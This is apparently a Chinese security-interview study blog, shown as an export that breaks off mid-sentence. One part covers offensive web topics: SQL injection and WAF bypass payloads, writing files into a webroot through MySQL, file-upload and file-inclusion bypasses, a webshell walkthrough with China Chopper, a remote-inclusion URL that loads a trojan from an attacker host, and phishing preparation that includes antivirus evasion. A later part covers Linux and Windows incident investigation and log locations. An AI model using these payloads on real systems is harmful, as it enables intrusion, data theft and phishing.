href="#问六十六：SQL-注入的分类" class="headerlink" title="问六十六：SQL 注入的分类"></a>问六十六：SQL 注入的分类</h3><p>数字型、字符型、GRT 注入、POST 注入、cookie 注入、布尔盲注、时间盲注、延时注入、编码注入、联合查询注入、堆查询注入等</p><ul><li>根据数据的传输方式<ul><li>GET 类型</li><li>POST 类型</li><li>COOKIE 类型</li></ul></li><li>根据数据的类型<ul><li>数字型</li><li>字符型</li></ul></li><li>根据注入的模式<ul><li>基于联合查询的注入模式</li><li>基于报错的注入模式</li><li>基于布尔的盲注</li><li>基于时间的盲注</li><li>基于查询的注入模式</li></ul></li></ul><h3 id="问六十七：SQL-注入的一般步骤"><a href="#问六十七：SQL-注入的一般步骤" class="headerlink" title="问六十七：SQL 注入的一般步骤"></a><strong>问六十七：SQL 注入的一般步骤</strong></h3><ul><li>求闭合字符</li><li>选择注入模式</li><li>爆数据库</li><li>爆表名</li><li>爆列名</li><li>爆字段</li></ul><h3 id="问六十八：QL-注入绕过方式"><a href="#问六十八：QL-注入绕过方式" class="headerlink" title="问六十八：QL 注入绕过方式"></a>问六十八：QL 注入绕过方式</h3><p>大小写绕过：<code>eg：id=-1 uniOn selEct 1,2,database()</code></p><p>内联注释绕过：<code>eg：id=-1 union /!select/ 1,2,database()</code></p><p>双写关键字：<code>eg：id=-1 union seselectlect 1,2,database()</code></p><p>特殊编码绕过：</p><ol><li>十六进制绕过</li></ol><pre class="line-numbers language-none"><code class="language-none">eg：UNION SELECT 1,group_concat(column_name) frominformation_schema.columns where table_name=0x61645F6C696E6B<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol><li>ascii 编码绕过</li></ol><pre class="line-numbers language-none"><code class="language-none">eg：Test =CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>Unicode 编码</li></ol><p>常用的几个符号的一些 Unicode 编码：</p><pre class="line-numbers language-none"><code class="language-none">单引号: %u0027、%u02b9、%u02bc、%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%a7空格：%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0左括号：%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8右括号：%u0029、%uff09、%c0%29、%c0%a9、%e0%80%a9<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="问六十九：SQL-注入读写文件的根本条件"><a href="#问六十九：SQL-注入读写文件的根本条件" class="headerlink" title="问六十九：SQL 注入读写文件的根本条件"></a>问六十九：SQL 注入读写文件的根本条件</h3><p>数据库允许导入导出（secure_file_priv）</p><p>当前用户用户文件操作权限（File_priv）</p><table><thead><tr><th>secure_file_prive  参数的设置</th><th>含义</th></tr></thead><tbody><tr><td>secure_file_prive=null</td><td>限制 mysqld 不允许导入导出</td></tr><tr><td>secure_file_priv=/tmp/</td><td>限制 mysqld 的导入导出只能发 生在 /tmp/ 目录下</td></tr><tr><td>secure_file_priv=’ ‘</td><td>不对 mysqld 的导入导出做限制</td></tr></tbody></table><p>secure_file_prive 直接在 my.ini 文件里设置即可</p><ul><li>load_file () 读文件</li></ul><p>into outfile /into dumpfile 写文件</p><p>条件： </p><ul><li>对 web 目录具有读写权限 </li><li>知道文件绝对路径 </li><li>能够使用联合查询（sql 注入时）</li></ul><p>outfile 与 dumpfile 的区别：</p><ul><li>dumpfile 适用于二进制文件，它会将目标文件 写入同一行内，outfile 则更适用于文本文件。</li></ul><p>命令：</p><pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">select load_file(‘d:/phpstudy/www/123.php’); select ‘123’ into outfile ‘d:/phpstudy/www/123.php’; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="问七十：常用的报错函数有哪些"><a href="#问七十：常用的报错函数有哪些" class="headerlink" title="问七十：常用的报错函数有哪些"></a>问七十：常用的报错函数有哪些</h3><table><thead><tr><th>函数名</th><th>函数名</th></tr></thead><tbody><tr><td>floor()</td><td>multipolygon()</td></tr><tr><td>updatexml()</td><td>linestring()</td></tr><tr><td>extractvalue()</td><td>ST_LatFromGeoHash()</td></tr><tr><td>exp()</td><td>ST_LongFromGeoHash()</td></tr><tr><td>GeometryCollection()</td><td>GTID_SUBSET()</td></tr><tr><td>polygon()</td><td>mutipoint()</td></tr><tr><td>GTID_SUBTRACT()</td><td>multionlinestring()</td></tr><tr><td>ST_PointFromGeoHash()</td><td></td></tr></tbody></table><p>强烈建议： 在 concat 查询语句后面添加一个标识符，如 0x23 updatexml (1,concat (0x23,payload,0x23),1) 因为有的时候报错信息会设置长度限制，添加标识符可以避免显示不完全</p><h3 id="问七十一：sqlmap-–os-shell-原理了解吗？"><a href="#问七十一：sqlmap-–os-shell-原理了解吗？" class="headerlink" title="问七十一：sqlmap –os-shell 原理了解吗？"></a>问七十一：sqlmap –os-shell 原理了解吗？</h3><p>sqlmap 的–os-shell 在 mysql 数据库中的原理，其实就是往服务器上写入了两个  php，其中一个给我们提供了文件上传的页面，可以通过这个上传页面上传脚本文件到当前目录下。另外一个则是返回了可以让我们执行系统命令的命令行，命令行也可以在网页 url 中通过对 cmd 参数传参执行系统命令。</p><h3 id="问七十二：WAF-是什么"><a href="#问七十二：WAF-是什么" class="headerlink" title="问七十二：WAF 是什么"></a>问七十二：WAF 是什么</h3><p>WAF 设备：绿盟 / 深信服 / 启明星辰 / 360 / 阿里云 WAF / 安全狗等</p><p>WAF 通过一组通常称为策略的规则运行。这些策略旨在通过过滤掉恶意流量来防止应用程序中的漏洞。WAF 的价值部分来自于实施策略修改的速度和便利性，从而可以更快地响应不同的攻击向量；在 DDoS 攻击期间，可以通过修改 WAF 策略快速实现限速。</p><p>** 三种 WAF ** 实现基于网络的 WAF 通常是基于硬件的。</p><ul><li><p>由于它们是在本地安装的，因此可以最大限度地减少延迟，但基于网络的 WAF 是最昂贵的选择，并且还需要存储和维护物理设备。  </p><p>代表产品有：Imperva、天清 WAG 等。</p></li><li><p>基于主机的 WAF 可以完全集成到应用程序的软件中。</p><p>此解决方案比基于网络的 WAF 更便宜，并且提供更多的可定制性。基于主机的 WAF 的缺点是消耗本地服务器资源、实施复杂性和维护成本，这些组件通常需要占用大量资源和时间。</p><p>代表产品：安全狗，云锁，D 盾等。  </p></li><li><p>基于云的 WAF 是一种云防火墙。</p><p>他们通常提供交钥匙安装，就像更改 DNS 以重定向流量一样简单。基于云的 WAF 还具有最低的前期成本，因为用户每月或每年为安全即服务付费。基于云的 WAF  还可以提供持续更新的解决方案，以抵御最新的威胁，而无需在用户端进行任何额外的工作或成本。基于云的 WAF 的缺点是用户将责任移交给第三方，因此  WAF 的某些功能对用户来说可能是一个黑匣子。  </p><p>代表产品有：阿里云云盾，腾讯云 WAF 等。</p></li></ul><h3 id="问七十三：WAF-的工作原理？"><a href="#问七十三：WAF-的工作原理？" class="headerlink" title="问七十三：WAF 的工作原理？"></a>问七十三：WAF 的工作原理？</h3><p>WAF 的处理流程大致可分为四部分：预处理、规则检测、处理模块、日志记录</p><ul><li><p>预处理</p><p>预处理阶段首先在接收到数据请求流量时会先判断是否为 HTTP/HTTPS 请求，之后会查看此 URL 请求是否在白名单之内，如果该 URL 请求在白名单列表里，直接交给后端 Web 服务器进行响应处理，对于不在白名单之内的对数据包解析后进入到规则检测部分。</p></li><li><p>规则检测</p><p>每一种 WAF 产品都有自己独特的检测规则体系，解析后的数据包会进入到检测体系中进行规则匹配，检查该数据请求是否符合规则，识别出恶意攻击行为。</p></li><li><p>处理模块</p><p>针对不同的检测结果，处理模块会做出不同的安全防御动作，如果符合规则则交给后端 Web 服务器进行响应处理，对于不符合规则的请求会执行相关的阻断、记录、告警处理。不同的 WAF  产品会自定义不同的拦截警告页面，在日常渗透中我们也可以根据不同的拦截页面来辨别出网站使用了哪款 WAF 产品，从而有目的性的进行 WAF 绕过。</p></li><li><p>日志记录</p><p>WAF 在处理的过程中也会将拦截处理的日志记录下来，方便用户在后续中可以进行日志查看分析。</p></li></ul><h3 id="问七十四：绕-WAF-的多种方式"><a href="#问七十四：绕-WAF-的多种方式" class="headerlink" title="问七十四：绕 WAF 的多种方式"></a>问七十四：绕 WAF 的多种方式</h3><ul><li><p>字母大小写混合绕过</p><p>原因：服务器端检测时未开启大小写不敏感</p><p>形式：<code>UnIon SeLecT</code></p></li><li><p>多重关键字</p><p>原因：服务器端检测到敏感字符时替换为空 </p><p>形式：<code>ununionion selselectect</code></p></li><li><p>注释</p><p>原因：服务器端未检测或检测不严注释内的字符串 </p><p>形式：<code>/**/，/*!*/，/*!12345*/，#，-- -</code> 等</p></li><li><p>编码绕过</p><p>原因：服务器端未检测或检测不严具有编码形式的关键字 </p><p>类型：十六进制编码、URL 编码、Unicode 编码 </p><p>形式：<code>0x61646d696e、%20、%u0020</code></p></li><li><p>等价函数或命令</p><p>原因：服务器端黑名单不完整，过滤不严 </p><p>形式： </p><p>Mysql 查询：<code>Union distinct、updatexml、Extractvalue、floor</code> </p><p>字符串截取函数：<code>mid、substr、substring、left、reverse </code></p><p>字符串连接函数：<code>concat、group_concat、concat_ws </code></p><p>字符串转换：<code>char、hex、unhex</code> </p><p>替换逗号：<code>limit 1 offset 0，mid(version() from 1 for 1) </code></p><p>替换等号：<code>like</code></p></li><li><p>组合绕过</p><p>原因：服务器端检测多处位置，需要多重绕过方式组合使用 </p><p>形式：<code>id = 1’ and/**/’1’like’2’/**//*!12345union*/select 1,2,3</code></p></li><li><p>特殊字符</p><p>原因：数据库中效果相同，服务器端却没有限制 </p><p>形式：</p><p>科学记数法 <code>and 1e0 = 1e0 </code></p><p>空白字符 <code>%0a %a0 %0b %20 %09 </code></p><p>反单引号 <code>table_name</code> </p><p>括号 <code>select * from (test.admin)</code></p></li></ul><h3 id="问七十五：文件上传"><a href="#问七十五：文件上传" class="headerlink" title="问七十五：文件上传"></a>问七十五：文件上传</h3><p>Web 应用程序通常会有文件上传的功能， 比如：在 BBS 发布图片、在个人网站上传头像、在招聘网站上发布个人的 DOCX 格式的简历等。只要是  Web 应用 程序允许上传文件，就有可能会有文件上传漏洞。 上传漏洞与其他漏洞相比风险很大，如果 Web 应用程序存在  上传漏洞，攻击者可以直接上传一个 Webshell 到服务器上， 这是相当危险的。</p><h3 id="问七十六：文件上传后遇到重定向怎么办"><a href="#问七十六：文件上传后遇到重定向怎么办" class="headerlink" title="问七十六：文件上传后遇到重定向怎么办"></a>问七十六：文件上传后遇到重定向怎么办</h3><p>这个问题说实话我没遇到过，也是学到了有可能会有这种防御手段；这其实就是网站为了防止文件上传攻击做出的防御手段，致使我们上传文件后直接跳转到其他网页</p><p>修改前端</p><p>绕过方法：前端页面 form 表单中 button 按钮默认类型 submit，修改为 button 可解决此问题</p><p>例如：将提交文件的 form 表单在浏览器控制台中中修改为 input 即可绕过</p><p>修改后端</p><p>如果是返回数据包中找不到 webshell 的路径无法连接，那就需要进行下一步，是否能跨目录传 shell，上传的 shell 没路径，是否可以通过信息收集找到 shell 路径，传 oss</p><h3 id="问七十七：文件上传绕过方法"><a href="#问七十七：文件上传绕过方法" class="headerlink" title="问七十七：文件上传绕过方法"></a>问七十七：文件上传绕过方法</h3><ul><li><p>关于文件上传其实打过 upload 的哪个靶场久很清楚了</p><ul><li>上传的 shell 不被解析怎么办：尝试文件包含</li><li>服务器端文件名拓展检测 - 绕过方法</li><li>文件名大小写绕过（AsP, pHp 等等）</li></ul></li><li><p>黑白名单绕过（php、php2、php3、php5、phtml、asp、aspx、 ascx、ashx、cer、asa、jsp、jspx）</p></li><li><p>特殊文件名绕过</p></li><li><p>修改数据包里的文件名改为 test.php. 或者 test.asp_ (下划线是空格) 由于这种命名格式在 windows 系统里是不允许的。所以在绕过上传之 后 windows 系统会自动去掉 点和空格。Unix/Linux 系统没有这个特 性。</p></li><li><p>0x00 截断绕过，解析漏洞</p><p>就是在 url 后面输入 %00</p><p>条件： allow_url_fopen = Off php 版本 &lt; 5.3.4</p></li></ul><h3 id="问七十八：文件包含"><a href="#问七十八：文件包含" class="headerlink" title="问七十八：文件包含"></a>问七十八：文件包含</h3><p>程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函 数时直接调用此文件，而无需再次编写，这种文件调用的过程一般被称为文件 包含。服务器执行 PHP 文件时，可以通过包含函数加载另一个文件中的  PHP 代码， 并且当 PHP 来执行，这会为开发者节省大量的时间。</p><p><strong>产生漏洞的原因</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php    $var = $GET['page'];    include($var . ".html");<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这是一段 PHP 代码，从代码上分析可以看出， 把一个 GET 请求的参数 “page” 传给了一个变 量  filename，然后包含了这个变量。然而，开发者没有对 $_GET [‘page’] 参数经过严格的过滤。直接带入了 include  的函数，我们可以修改 $_GET [‘page’] 的值，包含自己想看的文件。 （文件的路径一定要对，不对的话就包含不了）</p><p>这样，我们总结一下，文件包含漏洞就是： 程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变  量，用来进行动态调用，文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意  文件，导致了执行了非预期的代码。从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。</p><h3 id="问七十九：包含函数有那些"><a href="#问七十九：包含函数有那些" class="headerlink" title="问七十九：包含函数有那些"></a>问七十九：包含函数<em>有那些</em></h3><p>PHP 中文件包含函数有以下四种：</p><ul><li>require () 只要程序一运行就包含文件，找不到被包含的文件时会产生致命 错误，并停止脚本</li><li>require_once ()  若文件中代码已被包含则不会再次包含</li><li>include () 执行到 include 时才包含文件，找不到被包含文件时只会产生警告， 脚本将继续执行</li><li>include_once () 若文件中代码已被包含则不会再次包含</li></ul><h3 id="问八十：文件包含漏洞利用条件"><a href="#问八十：文件包含漏洞利用条件" class="headerlink" title="问八十：文件包含漏洞利用条件"></a>问八十：文件包含漏洞利用条件</h3><ul><li>程序用 include () 等文件包含函数通过动态变量的范式引入需要包含的文件 </li><li>用户能够控制该动态变量 </li><li>要保证 php.ini 中 allow_url_fopen 和 allow_url_include 要为 On</li></ul><h3 id="问八十一：文件包含漏洞的分类"><a href="#问八十一：文件包含漏洞的分类" class="headerlink" title="问八十一：文件包含漏洞的分类"></a>问八十一：文件包含漏洞的分类</h3><ul><li><p>本地包含</p><p>可以包含本地文件，在条件允许时甚至能执行代码 读敏感文件，读 PHP 文件包含日志文件 GetShell 包含 data: 或 php://input 等伪协议 若有 phpinfo 则可以包含临时文件 配合上传图片马，然后包含从而 GetShell</p></li><li><p>远程包含</p></li></ul><p>  包含远程的木马或病毒文件，从而 GetShell</p><p>注意：要实现远程文件包含需要 allow_url_fopen 和 allow_url_include 都开启</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php    $var = $GET['page'];    include($var . ".html");<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>在包含变量 $var 时，限制了只允许包含 “.html”  格式的文件，这就阻止了一些非法的包含其他文件的情况。</p><h3 id="问八十二：文件包含绕过限制"><a href="#问八十二：文件包含绕过限制" class="headerlink" title="问八十二：文件包含绕过限制"></a>问八十二：文件包含绕过限制</h3><p>绕过后面的 “. Html” 限制有很多方法可以实现</p><ol><li><p>%00 截断</p><p>就是在 url 后面输入 %00</p><p>条件： allow_url_fopen = Off php 版本 &lt; 5.3.4</p></li><li><p>长路径截断</p></li></ol><p>   条件：windows OS，点号需要长于 256；linux OS 长于 4096 windows 下目录最大长度为 256 字节，超出的部分会被丢 弃 linux 下目录最大长度为 4096 字节</p><ol start="3"><li><p>点点点点点号绕过</p><p>点号绕过的原理和长路径截断的一样： 原理是： windows 下目录最大长度为 256 字节， 超出的部分会被丢弃 linux 下目录最大长度为 4096 字节，  超出的部分会被丢弃 所以用….. 绕过的时候 windows 系统 中，点号需要长于 256 ；linux 系统 中点号要长于 4096</p></li></ol><h3 id="问八十三：开启包含功能的条件"><a href="#问八十三：开启包含功能的条件" class="headerlink" title="问八十三：开启包含功能的条件"></a>问八十三：开启包含功能的条件</h3><p>想要开启文件包含的 功能， 首先要修改 PHP 的配置 文件（PHP.ini）把文件里的功能选项开启。</p><p>在 Linux 中 PHP.ini 配置文件一般默认安装 在 /etc 目 录 下 。 下面是 两 个 功 能选项 ： </p><ul><li><p>allow_url_fopen ：</p><p>on 默认 开 启 该选项 为 on 便 是 激活了 URL 形式 的 fopen 封装协议使得可以访问 URL 对 象文件等。</p></li><li><p>allow_url_include ：</p><p>off 默认关闭，该选项 为 on 便 是允许 包含 URL 对 象文件等</p></li></ul><h3 id="问八十四：自己有没有实操过文件上传配合文件包含漏洞？"><a href="#问八十四：自己有没有实操过文件上传配合文件包含漏洞？" class="headerlink" title="问八十四：自己有没有实操过文件上传配合文件包含漏洞？"></a>问八十四：自己有没有实操过文件上传配合文件包含漏洞？</h3><p>发现一个上传文件页面，但只能上传图片。</p><p>我们可以利用火狐来绕过限制，首先设置浏览器的代理为 127.0.0.1 端口为 8080，然后打开 burp suite 工具待用 ，然后再次上传我们的木马文件，这时候 burp suite  工具会闪烁， 我们进入 burp suite ，发现找到了我们 刚刚发送的数据包，接下来我们需要修改一下文件格式这一选项， 把它的格式改为  image/jpeg，我们这么做的目的为了是欺骗一下服务器端的验证，让它以为是这是一个图片格式 的文件。我们点击一下 Forward ,  把它放过 然后切换到浏览器，我们发现文件上传成功了。</p><p>我们先把 BP 给关掉，然后再用文件包含的方式对上传上去的文件进行访问，查看文件是否真的上传成功文件上传成功！ 接下来我们使用中国菜刀连接一下我们的木马文件。</p><p>打开我们的中国菜刀，在地址栏中填上我们木马文件上传到的路径， 这里采用文件包含的形式 <a href="http://www.any.com/index.php?page=dvwa/hackable/uploads/shell.php">http://www.any.com/index.php?page=dvwa/hackable/uploads/shell.php</a> 密码为 f</p><p>脚本类型改为 PHP，点击添加之后，双击我们的链接进入 成功获取了 shell！！！</p><h3 id="问八十五：远程文件包含是什么？"><a href="#问八十五：远程文件包含是什么？" class="headerlink" title="问八十五：远程文件包含是什么？"></a>问八十五：远程文件包含是什么？</h3><p>远程文件包含本质上和 LFI (本地文件包含) 是同一个概 念，只是被包含的 “文件源” 不是从本次磁盘上获得，而 是从外部输入流得到。 如果 PHP 的配置选项  allow_url_include 为 ON 的话， 则 include/require 函数可以加载远程文件，这种漏洞被称为  “远程文件包含漏洞 (Remote File Inclusion RFI)”。</p><p>注意：如果是包含远程服务器上的 PHP 文件，那么得到的是被远程服务器解析过的 PHP，所以在写一句话木马的 时候就不要做成 .php 的文件 ，一般做成 .txt 的文件，再让它包含过来。</p><p>我们用 windows server 2003 服务器包含一个 Linux 上 的 phpinfo.php 文件，那么得到的就是 Linux 的 php 配置文件 ，而不是 Windows 上的 php 配置信息。</p><p>我们已知 192.168.173.128 这台服务器中存在着文件包含漏洞，我们想要通过远程包含自己的服务器上的木马文件，首先，我们在自己的服务器  192.168.173.129 上新建一 个文件 2.txt。我们通过远程包含文件包含到 192.168.173.128 这台目标 服务器上，  包含的方式与本地包含的方式类似： <a href="http://192.168.173.128/index.php?page=http://192">http://192.168.173.128/index.php?page=http://192</a>. 168.173.129/2.txt。然后我们访问，若看到页面显示正常，说明文件包含成功。</p><h3 id="问八十六：邮件钓鱼的准备工作有哪些？"><a href="#问八十六：邮件钓鱼的准备工作有哪些？" class="headerlink" title="问八十六：邮件钓鱼的准备工作有哪些？"></a>问八十六：邮件钓鱼的准备工作有哪些？</h3><p>钓鱼邮件，即一种伪造邮件，是指利用伪装的电子邮件，来欺骗收件人点击恶意 URL，或诱导收件人下载带恶意程序的可执行文件。</p><p> 1、确定邮件钓鱼的形式：链接、文件</p><p> 2、收集目标相关的邮箱 </p><p>3、编写钓鱼邮件文案 </p><p>4、匿名邮箱 </p><p>5、木马免杀测试、钓鱼站点搭建 </p><p>6、反溯源</p><h1 id="六、一些常用工具汇总"><a href="#六、一些常用工具汇总" class="headerlink" title="六、一些常用工具汇总"></a>六、一些常用工具汇总</h1><ul><li>威胁情报平台</li></ul><pre class="line-numbers language-BASH" data-language="BASH"><code class="language-BASH">https://x.threatbook.cn/ 微步在线威胁情报社区https://ti.qianxin.com/ 奇安信威胁情报中心https://ti.360.cn/ 360威胁情报中心https://www.venuseye.com.cn/  VenusEye威胁情报中心<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>域名反查</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">站长之家IP查询网址：https://ip.tool.chinaz.com/ipbatchIP138查询网：https://www.ip138.com/高精度IP定位：https://www.opengps.cn/Data/IP/LocHighAcc.aspxIP信息查询：https://www.ipip.net/ip.html/IP地址查询在线工具：https://tool.lu/ip/多地Ping检测：http://ping.chinaz.com/Whois查询：https://whois.chinaz.com/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>ip 定位网站</li></ul><pre class="line-numbers language-none"><code class="language-none">https://www.opengps.cn/Data/IP/ipplus.aspx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>在线子域名查询</li></ul><pre class="line-numbers language-none"><code class="language-none">https://phpinfo.me/domain/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>网站指纹识别</li></ul><pre class="line-numbers language-none"><code class="language-none">在线cms识别小插件：http://whatweb.bugscaner.com/look/wahtweb（需要安装）：https://github.com/urbanadventurer/WhatWeb云悉指纹：yunsee.cn-2.0参考链接：https://blog.csdn.net/qq_41755666/article/details/123614559https://blog.csdn.net/zsw15841822890/article/details/115774385<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> HW </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HW面经 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HW面经蓝初百题斩</title>
      <link href="/du-yu/interview-2.html"/>
      <url>/du-yu/interview-2.html</url>
      
        <content type="html"><![CDATA[<h2 id="Windows-入侵排查思路？"><a href="#Windows-入侵排查思路？" class="headerlink" title="Windows 入侵排查思路？"></a>Windows 入侵排查思路？</h2><ol><li>收集信息：收集与系统安全相关的信息，包括日志文件、进程列表、网络连接、系统配置等。</li><li>分析信息：对收集到的信息进行分析，确定异常行为和潜在威胁。</li><li>确认威胁：确认系统存在威胁，并确定其类型和程度。</li><li>阻止攻击：采取相应的措施，尽快阻止攻击并减少损失。</li><li>恢复系统：对受到攻击的系统进行恢复，确保其正常运行。</li></ol><p>具体来说，可以采取以下几种方法进行入侵排查：</p><ol><li>使用防病毒软件：定期使用防病毒软件扫描系统，及时发现并清除潜在的威胁。</li><li>定期更新系统：定期更新系统和安全补丁，以确保系统的安全性。</li><li>监控网络连接：监控网络连接情况，及时发现异常连接和流量，以及非法访问尝试。</li><li>分析日志文件：分析日志文件，了解系统的使用情况和异常行为，及时发现威胁。</li><li>使用安全工具：使用安全工具，如入侵检测系统、网络监控系统等，帮助发现和阻止威胁。</li><li>加强用户教育：加强用户教育，提高用户安全意识，减少人为因素对系统安全的影响。</li></ol><p>总之，入侵排查需要综合运用多种工具和方法，不断加强系统的安全性和监控能力，以保障系统的安全运行。</p><hr><h2 id="Linux-入侵排查思路？"><a href="#Linux-入侵排查思路？" class="headerlink" title="Linux 入侵排查思路？"></a>Linux 入侵排查思路？</h2><ol><li>收集基础信息：收集系统的版本、配置文件和日志等信息，了解系统的正常运行状态。</li><li>分析异常行为：通过比较正常状态与异常状态的差异，分析系统上出现的任何异常行为，例如不寻常的进程、网络流量或文件更改。</li><li>确认入侵点：确定攻击者可能入侵的方式，并检查是否存在未修复的漏洞。</li><li>隔离受感染的系统：及时隔离受感染的系统，以限制损害并避免进一步传播。</li><li>恢复系统：清除恶意代码并修复受损部分，通过备份恢复数据和配置文件，确保系统安全。</li><li>收集证据：收集入侵事件的详细信息，包括攻击的时间、入侵的方式、影响范围、损失情况等，以便后续追踪和定位攻击者。</li></ol><p>在实际操作中，需要结合专业的工具和技能进行排查，例如使用抓包工具Wireshark分析网络流量、使用进程监控工具ps、top、htop等查看进程运行情况。同时，还需要不断学习更新各种安全相关的技能和知识，以提高排查入侵事件的能力。</p><hr><h2 id="Linux-如何查看登录日志？有哪些相关消息文件？"><a href="#Linux-如何查看登录日志？有哪些相关消息文件？" class="headerlink" title="Linux 如何查看登录日志？有哪些相关消息文件？"></a>Linux 如何查看登录日志？有哪些相关消息文件？</h2><p>在 Linux 系统中，可以通过以下方式查看登录日志：</p><ol><li>/var/log/auth.log文件：该文件记录了所有用户的认证信息，包括 SSH 登录、sudo 访问以及 su 切换等操作。</li><li>/var/log/secure文件：该文件用于记录系统身份验证和授权消息，通常在 Red Hat 系统上使用。其中包括 SSH 登录、sudo 访问以及 su 切换等操作。</li><li>/var/log/messages文件：该文件记录了系统的运行消息，包括启动和关闭服务、内核消息以及其他重要事件。</li><li>w命令：可以查看当前已登录的用户和他们的会话信息。</li><li>last命令：可以查看最近所有登录和注销会话的用户列表以及日期和时间。</li><li>lastlog命令：可以查看所有用户最后一次登录的时间和位置。</li></ol><p>需要注意的是，在某些系统中这些文件名可能会有所不同，例如 Ubuntu 系统中的 /var/log/auth.log 文件可能是 /var/log/auth.log.1、/var/log/auth.log.2.gz等形式。因此，在查看登录日志时，最好先了解当前系统的具体情况。</p><hr><h2 id="Windows-和-Linux-的日志文件放在哪里？"><a href="#Windows-和-Linux-的日志文件放在哪里？" class="headerlink" title="Windows 和 Linux 的日志文件放在哪里？"></a>Windows 和 Linux 的日志文件放在哪里？</h2><p>Windows:</p><ol><li>系统事件记录器：Event Viewer 应用程序中提供了 Windows 系统的事件日志管理工具。这些日志文件通常存储在 C:\Windows\System32\winevt\Logs 目录中。</li><li>应用程序日志：包括应用程序特定的事件、错误和警告等信息，可以使用 Event Viewer 应用程序进行查看。这些日志文件通常存储在应用程序的安装目录下或者 Windows 系统目录中。</li><li>安全日志：记录有关系统安全性的重要信息，例如登录、注销、权限更改等。这些日志文件通常存储在 C:\Windows\System32\winevt\Security.evtx 文件中。</li></ol><p>Linux:</p><ol><li>系统日志：Linux 系统中的所有日志都存储在 /var/log 目录下。主要的日志文件包括：</li></ol><ul><li>/var/log/messages：记录系统启动期间的消息以及其他系统级别的消息。</li><li>/var/log/syslog：记录核心系统日志，也包括其他应用程序的日志。</li><li>/var/log/auth.log：记录用户登录和其他身份验证相关事件的日志文件。</li></ul><ol><li>各种服务/软件的日志文件：各种服务或软件分别根据自己的命名规范来命名相应的日志文件，其中一些可能位于 /var/log 目录下，而另一些则可能位于 /var/log/service 目录下。</li></ol><p>需要注意的是，日志文件在系统运行一段时间后可能会变得非常庞大，因此需要定期进行归档和清理，以释放磁盘空间并提高系统性能。</p><hr><h2 id="Linux-常用排查命令有哪些？"><a href="#Linux-常用排查命令有哪些？" class="headerlink" title="Linux 常用排查命令有哪些？"></a>Linux 常用排查命令有哪些？</h2><p>在 Linux 系统中，有许多工具和命令可以用来排查问题。以下是一些常用的排查命令：</p><ol><li>top：显示当前系统中最占用 CPU 和内存的进程。</li><li>ps：显示当前系统所有运行的进程列表。</li><li>netstat：显示网络连接状态和统计信息，例如打开的端口、TCP/UDP 连接和网络接口等。</li><li>ifconfig/iwconfig：显示网络接口的状态和配置信息。</li><li>ping/traceroute：用于测试网络是否连通以及检测网络故障的工具。</li><li>df/du：显示磁盘使用情况，包括已用空间和可用空间等信息。</li><li>ls/lsof：用于查看打开的文件、目录和文件描述符。</li><li>strace/ltrace：跟踪应用程序执行期间的系统调用和库函数调用。</li><li>tcpdump：捕获网络数据包并将其记录到日志文件中，以便进行后续分析。</li><li>tail：实时监视日志文件，并显示最新添加的日志信息。</li></ol><p>以上这些命令只是其中的一部分，不同的问题可能需要使用不同的命令和工具。在实际操作中，需要根据具体的情况选择合适的命令和工具，并结合自己的经验和知识进行排查。</p><hr><h2 id="Linux-的-Selinux-是什么？如何设置-Selinux？"><a href="#Linux-的-Selinux-是什么？如何设置-Selinux？" class="headerlink" title="Linux 的 Selinux 是什么？如何设置 Selinux？"></a>Linux 的 Selinux 是什么？如何设置 Selinux？</h2><p>SELinux（Security-Enhanced Linux）是一个针对 Linux 内核的安全模块，它可以限制进程和用户的访问权限，并提供更加细粒度的访问控制。SELinux 基于强制访问控制（MAC）模型，将每个进程/对象分配到不同的安全上下文中，并通过策略文件来定义这些上下文之间的关系。</p><p>在 Linux 中，SELinux 可以通过以下步骤进行设置：</p><ol><li>检查 SELinux 状态：使用命令 getenforce 或者 sestatus 来检查当前 SELinux 的状态，例如 enforcing、permissive 或者 disabled 等。</li><li>修改 SELinux 配置文件 /etc/selinux/config：可以修改 SELINUX 参数的值为 enforcing（强制模式）、permissive（宽容模式）或者disabled（禁用 SELinux）等。</li><li>安装和管理 SELinux 策略包：使用 yum 命令安装和管理 SELinux 相关的策略包，例如 policycoreutils 和 selinux-policy 等。</li><li>设定 SELinux 上下文：使用 chcon、semanage 和 restorecon 等命令来更改文件或目录的安全上下文。</li><li>确认 SELinux 日志：在排除 SELinux 相关问题时可以使用命令 ausearch、ausearch、auditctl 等来确认 SELinux 日志。</li></ol><p>需要注意的是，在对 SELinux 进行设置和管理时，需要有一定的 Linux 系统管理经验和 SELinux 相关知识。因为错误的配置可能会导致系统不稳定或者无法启动，所以在操作前应仔细阅读相关文档并进行备份。</p><hr><h2 id="Linux、Windows-安全加固"><a href="#Linux、Windows-安全加固" class="headerlink" title="Linux、Windows 安全加固"></a>Linux、Windows 安全加固</h2><p>Linux 